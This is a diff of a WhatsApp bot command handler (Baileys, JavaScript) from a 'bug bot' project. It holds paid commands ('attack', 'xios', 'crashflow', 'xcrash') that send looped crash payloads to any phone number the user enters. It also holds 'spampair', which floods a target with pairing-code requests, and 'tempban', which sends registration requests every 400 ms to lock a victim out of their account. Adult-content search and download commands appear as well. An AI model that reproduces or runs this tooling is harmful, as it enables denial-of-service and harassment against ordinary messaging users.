-return reply('sukses mengaktifkan antibug')
-}
-break
-
-case 'antibugoff': {
-if (!isOwner) return reply("Fitur Khusus User Tertentu!!") 
-global.antibug = false
-return reply('sukses menonaktifkan antibug')
-}
-break
-
-case 'clearchat': {
-pee = "\n".repeat(1000)
-return reply(pee + '😁🖕')
-}
-break
-
-case 'katakatajack': {
-if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
-await zyn.sendMessage(m.chat, {text: `tetaplah semangat jangan putus asa karna kejamnya dunia ini paham!!! by JALLMODS`},{quoted: m})
-sleep(2000)
-return reply(`🥶`)
-}
-break
-
-case "sticker": 
-case "stiker":
-case "s": {
-if (!isOwner) return reply(mess.only.owner)
-if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
-if (/image/.test(mime)) {
-let media = await quoted.download()
-let encmedia = await zyn.sendStimg(from, media, m, { packname: global.packname, author: global.author })
-await fs.unlinkSync(encmedia)
-} else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
-let media = await quoted.download()
-let encmedia = await zyn.sendStvid(from, media, m, { packname: global.packname, author: global.author })
-await fs.unlinkSync(encmedia)
-} else {
-reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
-}
-}
-break
-
-case 'stuk': case 'flow': 
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(bugres)
-for (let i = 0; i < 50; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
-await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
-}
-reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
-break
-
-case 'fuck': case 'tzy': 
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(bugres)
-for (let i = 0; i < 50; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
-await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
-}
-reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
-break
-
-case 'vip': case 'attack': case 'andro': 
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(bugres)
-for (let i = 0; i < 30; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
-await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
-}
-reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
-break
-
-case 'xios': case 'iphone': case 'xip':
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(bugres)
-for (let i = 0; i < 40; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
-await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
-await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
-}
-reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
-break
-
-case 'overflow': case 'vasion': case 'crashflow': 
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-reply(bugres)
-for (let i = 0; i < 40; i++) {
-await buk1(zyn, target, "p", 1020000, ptcp = true);
-sendQP(target, wanted)
-await sendQP(target, wanted)
-await beta2(zyn, target, wanted)
-await sendSessionStructure(target, wanted)
-await beta1(zyn, target, wanted)
-}
-reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
-break
-
-
-
-
-case 'xcrash': {
-if (!isPremium) return reply(mess.only.premium)
-if (!q) return reply(`Example: ${prefix + command} 62×××`)
-target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-				let sections = [{
-						title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
-						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
-							id: `vip ${target}`
-						}]
-					},
-					{
-						highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
-							id: `andro ${target}`
-						}]
-					},
-					{
-						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
-							id: `attack ${target}`
-						}]
-					},
-					{
-						title: '⌜ 𝐈𝚯𝐒 ⌟',
-						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
-							id: `xios ${target}`
-						}]
-					},
-					{
-						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
-							id: `xip ${target}`
-						}]
-					},
-					{
-						highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
-						rows: [{
-							title: '𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬',
-							id: `iphone ${target}`
-						}]
-					},
-					{
-						title: '⌜ 𝐙𝐍𝐗 ⌟',
-						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
-							id: `crashflow ${target}`
-						}]
-					},
-					{
-						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
-							id: `vasion ${target}`
-						}]
-					},
-					{
-						highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
-						rows: [{
-							title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
-							id: `overflow ${target}`
-						}]
-					}]
-let listMessage = {
-    title: '𝐕𝐗𝚯 ❄ 𝐙𝐀𝚸', 
-    sections
-};
-
-let msg = generateWAMessageFromContent(m.chat, {
- viewOnceMessage: {
- message: {
- "messageContextInfo": {
- "deviceListMetadata": {},
- "deviceListMetadataVersion": 2
- },
- interactiveMessage: proto.Message.InteractiveMessage.create({
- contextInfo: {
- mentionedJid: [m.sender], 
- isForwarded: true, 
- forwardedNewsletterMessageInfo: {
- newsletterJid: "0@newsletter",
- newsletterName: 'Powered By JackTzy', 
- serverMessageId: -1
-},
- businessMessageForwardInfo: { businessOwnerJid: zyn.decodeJid(zyn.user.id) },
- }, 
- body: proto.Message.InteractiveMessage.Body.create({
- text: (`\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${target}`)
- }),
- footer: proto.Message.InteractiveMessage.Footer.create({
- text: ``
- }),
- header: proto.Message.InteractiveMessage.Header.create({
- title: '',
- subtitle: "𝐙𝐲𝐧𝐓𝐳𝐲",
- hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/xbug.jpg")}, { upload: zyn.waUploadToServer })) 
- }),
- nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
- buttons: [ 
- {
- "name": "single_select",
-"buttonParamsJson": JSON.stringify(listMessage)
-},  {
- "name": "cta_url",
- "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
- },
- ]
- })
- })
- }
- }
-}, {})
-
-await zyn.relayMessage(msg.key.remoteJid, msg.message, {
- messageId: msg.key.id
-})}
-break
-
-case 'hdvid' :
-case 'hdvideo': 
-case 'vidiohd':
-case 'tohd': 
-case 'vidhd' : {
-const { TelegraPh } = require('../database/lib//uploader');
-const { exec } = require('child_process');
-const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
-//const name = await zyn.getName(who);
-const q = m.quoted ? m.quoted : m;
-const mime = (q.msg || q).mimetype || '';
-if (!mime) return m.reply(`Mana vidio nya bang?`);
-reply(mess.wait);
-const media = await zyn.downloadAndSaveMediaMessage(q);
-const url = await TelegraPh(media);
-const output = 'output.mp4'; // Nama file output
-// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
-exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
-  if (error) {
-    console.error(`Error: ${error.message}`);
-    return;
-  }
-  console.log(`stdout: ${stdout}`);
-  console.error(`stderr: ${stderr}`);
-
-  // Mengunggah video yang telah ditingkatkan resolusinya
-  zyn.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
-})
-await sleep(60000)
-fs.unlinkSync(output)
-fs.unlinkSync(media)
-}
-break
-
-
-
-
- 
-
-
-case 'xnxxsearch': {
-			if (!text) return m.reply(`Kirim Judul Bokep`)
-			try {
-				const fg = require('api-dylux')
-				let res = await fg.xnxxSearch(text)
-				m.reply(mess.wait)
-				let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
-				if (res.status) m.reply(ff)
-				
-			} catch (error) {
-				console.error(error);
-				m.reply('Yah Error');
-			}
-		}
-		break
-case 'xnxxdl': {
-			if (!text) return m.reply(`Kirim Link Bokep di situs XNXX`)
-			if (!text.includes('xnxx.com')) return m.reply(`Kirim Link Bokep di situs XNXX`)
-			try {
-			m.reply(mess.wait)
-				const fg = require('api-dylux')
-				let xn = await fg.xnxxdl(text)
-				let tobatrek = `*XNXX DOWNLOAD*
+            case 'sticker':
+            case 's': {
+                if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner
+                if (!quoted) return reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`); // Ensure there’s a quoted message
+
+                try {
+                    let mime = quoted.mimetype || '';
+
+                    if (/image/.test(mime)) { // If the quoted message is an image
+                        let media = await quoted.download(); // Download the image
+                        await zyn.sendStimg(m.chat, media, m, {
+                            packname: global.packname,
+                            author: global.author
+                        }); // Send the image as a sticker
+
+                    } else if (/video/.test(mime)) { // If the quoted message is a video
+                        if ((quoted.msg || quoted).seconds > 9) { // Check video length (should be 1-9 seconds)
+                            return reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`);
+                        }
+                        let media = await quoted.download(); // Download the video
+                        await zyn.sendStvid(m.chat, media, m, {
+                            packname: global.packname,
+                            author: global.author
+                        }); // Send the video as a sticker
+
+                    } else {
+                        reply(`Send/Reply to Images/Videos/Gifs with the caption ${prefix + command}\nVideo Duration: 1-9 Seconds`); // Handle unsupported media
+                    }
+
+                } catch (error) {
+                    console.error(error);
+                    reply("An error occurred while processing the sticker. Please try again.");
+                }
+            }
+            break;
+            case 'hrt':
+            case 'love': {
+                if (!isOwner) return bluereply(mess.owner);
+
+                // Array of heart emojis to send one by one
+                const heartEmojis = [
+                    '♥️', '❣️', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '❤️‍🔥',
+                    '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💕',
+                    '🫀', '💓', '💝', '💞', '💓', '💘', '💗', '💝', '💓'
+                ];
+
+                // Send the initial message
+                const loveMsg = await zyn.sendMessage(m.chat, {
+                    text: heartEmojis[0]
+                }, {
+                    quoted: m
+                });
+
+                // Function to update the message with new emojis
+                const updateMessage = async (index = 1) => {
+                    if (index < heartEmojis.length) {
+                        await zyn.relayMessage(m.chat, {
+                            protocolMessage: {
+                                key: loveMsg.key,
+                                type: 14,
+                                editedMessage: {
+                                    conversation: heartEmojis[index]
+                                }
+                            }
+                        }, {});
+
+                        // Schedule the next update after 2 seconds
+                        setTimeout(() => updateMessage(index + 1), 1000);
+                    }
+                };
+
+                // Start updating the message with heart emojis one by one
+                setTimeout(() => updateMessage(), 1000);
+                break;
+            }
+            case 'confuse':
+            case 'conf': {
+                if (!isOwner) return reply(mess.owner);
+
+                // Array of confused-themed emojis to send one by one
+                const confusedEmojis = [
+                    '😕', '🤔', '😵', '😵‍💫', '🤷', '🤷‍♂️', '🤷‍♀️', '😮‍💨', '😐', '🤨',
+                    '🙃', '😬', '😯', '😖', '😑', '😳', '🤪', '🤯'
+                ];
+
+                // Send the initial confused emoji
+                const confuseMsg = await zyn.sendMessage(m.chat, {
+                    text: confusedEmojis[0]
+                }, {
+                    quoted: m
+                });
+
+                // Function to update the message with new confused emojis
+                const updateMessage = async (index = 1) => {
+                    if (index < confusedEmojis.length) {
+                        await zyn.relayMessage(m.chat, {
+                            protocolMessage: {
+                                key: confuseMsg.key,
+                                type: 14,
+                                editedMessage: {
+                                    conversation: confusedEmojis[index]
+                                }
+                            }
+                        }, {});
+
+                        // Schedule the next update after 2 seconds
+                        setTimeout(() => updateMessage(index + 1), 1000);
+                    }
+                };
+
+                // Start updating the message with confused emojis one by one
+                setTimeout(() => updateMessage(), 1000);
+                break;
+            }
+            case 'angry':
+            case 'gtf': {
+                if (!isOwner) return bluereply(mess.owner);
+
+                // Array of angry-themed stickers/emojis to send one by one
+                const angryEmojis = [
+                    '😡', '😠', '🤬', '👿', '💢', '🔥', '😾', '😤', '🤯', '💥',
+                    '😾', '👺', '👊', '🗯️', '😒', '👎', '🥵', '🧨', '👹', '💣',
+                    '😠', '👊', '💥', '😡', '🤬', '🔥', '🖕🏽'
+                ];
+
+                // Send the initial angry emoji
+                const angryMsg = await zyn.sendMessage(m.chat, {
+                    text: angryEmojis[0]
+                }, {
+                    quoted: m
+                });
+
+                // Function to update the message with new emojis/stickers
+                const updateMessage = async (index = 1) => {
+                    if (index < angryEmojis.length) {
+                        await zyn.relayMessage(m.chat, {
+                            protocolMessage: {
+                                key: angryMsg.key,
+                                type: 14,
+                                editedMessage: {
+                                    conversation: angryEmojis[index]
+                                }
+                            }
+                        }, {});
+
+                        // Schedule the next update after 2 seconds
+                        setTimeout(() => updateMessage(index + 1), 1000);
+                    }
+                };
+
+                // Start updating the message with angry emojis/stickers one by one
+                setTimeout(() => updateMessage(), 1000);
+                break;
+            }
+            case 'glitchtext':
+            case 'writetext':
+            case 'advancedglow':
+            case 'typographytext':
+            case 'pixelglitch':
+            case 'neonglitch':
+            case 'flagtext':
+            case 'flag3dtext':
+            case 'deletingtext':
+            case 'blackpinkstyle':
+            case 'glowingtext':
+            case 'underwatertext':
+            case 'logomaker':
+            case 'cartoonstyle':
+            case 'papercutstyle':
+            case 'watercolortext':
+            case 'effectclouds':
+            case 'blackpinklogo':
+            case 'gradienttext':
+            case 'summerbeach':
+            case 'luxurygold':
+            case 'multicoloredneon':
+            case 'sandsummer':
+            case 'galaxywallpaper':
+            case '1917style':
+            case 'makingneon':
+            case 'royaltext':
+            case 'freecreate':
+            case 'galaxystyle':
+            case 'lighteffects': {
+
+                if (!q) return reply(`Example : ${prefix+command} BLUE DEMON`)
+                bluereply(mess.wait)
+                let link
+                if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
+                if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
+                if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
+                if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
+                if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
+                if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
+                if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
+                if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
+                if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
+                if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
+                if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
+                if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
+                if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
+                if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
+                if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
+                if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
+                if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
+                if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
+                if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
+                if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
+                if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
+                if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
+                if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
+                if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
+                if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
+                if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
+                if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
+                if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
+                if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
+                if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
+                let haldwhd = await ephoto(link, q)
+                zyn.sendMessage(m.chat, {
+                    image: {
+                        url: haldwhd
+                    },
+                    caption: `*SUCCESS BY BLUEDEMON*`
+                }, {
+                    quoted: m
+                })
+            }
+            break
+            
+            case 'spampair': {
+                const usePairingCode = true
+                const NodeCache = require("node-cache")
+                const resolveMsgBuffer = new NodeCache()
+                if (!isOwner) return
+                if (!q) return reply(`*👾*\n\n*_Use : Spampair NUMBER*|AMOUNT_\n_Example : Spampair 62xx_`)
+                let [peenis, pepekk = "200"] = q.split("|")
+                await reply(`👾𝙎𝙋𝘼𝙈 𝘾𝙊𝘿𝙀 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔👾`)
+                await reaction(m.chat, "✅")
+                let target = peenis.replace(/[^0-9]/g, '').trim()
+                let {
+                    default: makeWaSocket,
+                    useMultiFileAuthState,
+                    fetchLatestBaileysVersion
+                } = require('@whiskeysockets/baileys')
+                let {
+                    state
+                } = await useMultiFileAuthState('pairSess')
+                let {
+                    version
+                } = await fetchLatestBaileysVersion()
+                let sucked = await makeWaSocket({
+                    auth: state,
+                    browser: ['Mac Os', 'chrome', '121.0.6167.159'],
+                    version: [2, 2413, 1],
+                    keepAliveIntervalMs: 50000,
+                    printQRInTerminal: !usePairingCode,
+                    generateHighQualityLinkPreview: true,
+                    resolveMsgBuffer,
+                    logger: pino({
+                        level: "silent"
+                    }),
+                    level: 'fatal'
+                })
+                for (let i = 0; i < pepekk; i++) {
+                    await sleep(2000)
+                    let prc = await sucked.requestPairingCode(target)
+                    await console.log(`# Succes Spam Pairing Code - Number : ${target} - Code : ${prc}`)
+                }
+                await sleep(2000)
+            }
+            break
+
+
+
+            case 'tempban': {
+                if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
+                if (!text) return reply(`Example: ${prefix + command} 62|8xxx`)
+                if (!/|/.test(text)) return reply(`Data yang anda berikan tidak valid!, Contoh: \n ${command} 62|8xxx`)
+                let numbers = JSON.parse(fs.readFileSync('./lib/tempban.json'))
+
+                let cCode = q.split("|")[0]
+                let number = q.split("|")[1]
+                let fullNo = cCode + number
+
+                await reply(`❗ Sukses! Gangguan Registrasi telah berhasil diaktifkan ke target : ${fullNo} menggunakan ${command} dalam jangka waktu tak terbatas ✅. Gangguan registrasi akan dihentikan jika server di-restart, mati, atau down Ⓜ️.`)
+
+                let {
+                    state,
+                    saveCreds
+                } = await useMultiFileAuthState('tb')
+
+                let spam = makeWaSocket({
+                    auth: state,
+                    mobile: true,
+                    logger: pino({
+                        level: 'silent'
+                    })
+                })
+
+                let dropNumber = async () => {
+                    try {
+                        let res = await spam.requestRegistrationCode({
+                            phoneNumber: `+${fullNo}`,
+                            phoneNumberCountryCode: cCode,
+                            phoneNumberNationalNumber: number,
+                            phoneNumberMobileCountryCode: 724,
+                        })
+
+                        if (res.reason === 'temporarily_unavailable') {
+                            console.log(`Nomor Invalid (Kemungkinan Registrasi Terganggu): +${res.login}`)
+                            await sleep(1000)
+                            await dropNumber()
+                        }
+                    } catch (error) {
+                        console.error(error)
+                    }
+                }
+
+                numbers[fullNo] = {
+                    cCode,
+                    number
+                };
+                fs.writeFileSync('./lib/tempban.json', JSON.stringify(numbers, null, '\t'));
+                setInterval(() => {
+                    dropNumber()
+                }, 400)
+            }
+            break
+
+
+            case 'antibugon': {
+                if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
+                global.antibug = true
+                return reply('sukses mengaktifkan antibug')
+            }
+            break
+
+            case 'antibugoff': {
+                if (!isOwner) return reply("Fitur Khusus User Tertentu!!")
+                global.antibug = false
+                return reply('sukses menonaktifkan antibug')
+            }
+            break
+
+           
+
+            case 'stuk':
+            case 'flow':
+                if (!isPremium) return reply(mess.only.premium)
+                if (!q) return reply(`Example: ${prefix + command} 62×××`)
+                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+                reply(bugres)
+                for (let i = 0; i < 50; i++) {
+                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    sendQP(target, wanted)
+                    await sendQP(target, wanted)
+                    await beta2(zyn, target, wanted)
+                    await sendSessionStructure(target, wanted)
+                    await beta1(zyn, target, wanted)
+                }
+                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                break
+
+            case 'fuck':
+            case 'tzy':
+                if (!isPremium) return reply(mess.only.premium)
+                if (!q) return reply(`Example: ${prefix + command} 62×××`)
+                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+                reply(bugres)
+                for (let i = 0; i < 50; i++) {
+                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    sendQP(target, wanted)
+                    await sendQP(target, wanted)
+                    await beta2(zyn, target, wanted)
+                    await sendSessionStructure(target, wanted)
+                    await beta1(zyn, target, wanted)
+                }
+                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                break
+
+            case 'vip':
+            case 'attack':
+            case 'andro':
+                if (!isPremium) return reply(mess.only.premium)
+                if (!q) return reply(`Example: ${prefix + command} 62×××`)
+                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+                reply(bugres)
+                for (let i = 0; i < 30; i++) {
+                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    sendQP(target, wanted)
+                    await sendQP(target, wanted)
+                    await beta2(zyn, target, wanted)
+                    await sendSessionStructure(target, wanted)
+                    await beta1(zyn, target, wanted)
+                }
+                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                break
+
+            case 'xios':
+            case 'iphone':
+            case 'xip':
+                if (!isPremium) return reply(mess.only.premium)
+                if (!q) return reply(`Example: ${prefix + command} 62×××`)
+                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+                reply(bugres)
+                for (let i = 0; i < 40; i++) {
+                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    await sendQP(target, wanted)
+                    await beta2(zyn, target, wanted)
+                    await sendSessionStructure(target, wanted)
+                    await beta1(zyn, target, wanted)
+                }
+                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                break
+
+            case 'overflow':
+            case 'vasion':
+            case 'crashflow':
+                if (!isPremium) return reply(mess.only.premium)
+                if (!q) return reply(`Example: ${prefix + command} 62×××`)
+                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+                reply(bugres)
+                for (let i = 0; i < 40; i++) {
+                    await buk1(zyn, target, "p", 1020000, ptcp = true);
+                    sendQP(target, wanted)
+                    await sendQP(target, wanted)
+                    await beta2(zyn, target, wanted)
+                    await sendSessionStructure(target, wanted)
+                    await beta1(zyn, target, wanted)
+                }
+                reply(`𝙎𝙪𝙘𝙘𝙚𝙨 𝙎𝙚𝙣𝙙 𝘽𝙪𝙜 𝙏𝙤 ${target}`)
+                break
+
+
+
+
+            case 'xcrash': {
+                if (!isPremium) return reply(mess.only.premium)
+                if (!q) return reply(`Example: ${prefix + command} 62×××`)
+                target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
+                let sections = [{
+                        title: '⌜ 𝐀𝐍𝐃𝐑𝚯𝐈𝐃 ⌟',
+                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝐙͢𝐧ͯ𝐱𝐈͢𝐯ͮ𝐬 𝐗͢𝟏༑',
+                            id: `vip ${target}`
+                        }]
+                    },
+                    {
+                        highlight_label: "🎭⃟༑⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝐗𝐳͢𝐞ͯ𝐭𝐬 𝐗͢𝟐༑',
+                            id: `andro ${target}`
+                        }]
+                    },
+                    {
+                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝐈𝐧ͮ͢𝐕𝐢𝐬ͯ͢𝐢𝐗 𝐗͢𝟕༑',
+                            id: `attack ${target}`
+                        }]
+                    },
+                    {
+                        title: '⌜ 𝐈𝚯𝐒 ⌟',
+                        highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝑪͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
+                            id: `xios ${target}`
+                        }]
+                    },
+                    {
+                        highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝐓͢𝒓𝒂ͯ͢𝒔𝒉 𝐈𝐨ͮ͢𝐒༑',
+                            id: `xip ${target}`
+                        }]
+                    },
+                    {
+                        highlight_label: "🎭⃟༑⌁⃰𝑨͢𝒑𝒑𝒍𝒆ཀ͜͡🐉",
+                        rows: [{
+                            title: '𝐓𝐫𝐚𝐯𝐚 𝐈𝐨𝐬',
